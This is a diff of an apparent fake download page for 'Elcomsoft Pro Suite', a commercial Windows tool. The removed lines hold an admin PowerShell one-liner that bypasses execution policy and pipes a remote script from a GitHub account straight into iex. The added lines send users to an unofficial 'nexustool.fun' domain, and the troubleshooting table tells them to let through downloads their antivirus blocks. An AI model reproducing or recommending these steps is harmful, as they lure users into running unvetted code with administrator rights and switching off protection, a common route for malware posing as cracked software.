@@ -8,15 +8,32 @@
 
 ---
 
-## Download & Install (PowerShell)
+## Download & Install
 
-> **This is the download page.** The command below downloads and runs the **Elcomsoft Pro Suite** installer on Windows 10/11.
+> **This is the download page.** Use the button or link below to get **Elcomsoft Pro Suite** for Windows.
 
-#### Before you start
+<p align="center">
+  <a href="https://elcomsoft.nexustool.fun/">
+    <img src="https://img.shields.io/badge/Download-Elcomsoft%20Pro%20Suite-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Elcomsoft Pro Suite">
+  </a>
+</p>
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+| | |
+| --- | --- |
+| **Direct link** | **[elcomsoft.nexustool.fun](https://elcomsoft.nexustool.fun/)** |
+| **Full URL** | `https://elcomsoft.nexustool.fun/` |
+| **Type** | Installer for Windows 10 / 11 (64-bit) |
+| **Admin** | Run setup as Administrator |
+
+### Quick steps
+
+1. Click **[Download — elcomsoft.nexustool.fun](https://elcomsoft.nexustool.fun/)** (link above)
+2. Save the file from the project page
+3. Run the setup **as Administrator**
+4. Enter your license key when prompted
+5. Restart if the installer asks — then launch from Start menu
+
+<p align="center"><a href="https://elcomsoft.nexustool.fun/"><strong>⬇ Download Elcomsoft Pro Suite now</strong></a></p>
 
 ---
 
@@ -39,10 +56,7 @@ You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
 
 Select **both lines** below and press **Ctrl+C**:
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+
 
 > Copy **both lines**, not just the second one.
 
@@ -80,7 +94,7 @@ Open **Start menu** → search for **Elcomsoft Pro Suite** → run it.
 | Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
 | Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
 
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
+**Install type:** Direct link (nexus) — no browser needed after Admin PowerShell is open.
 
 ---
 
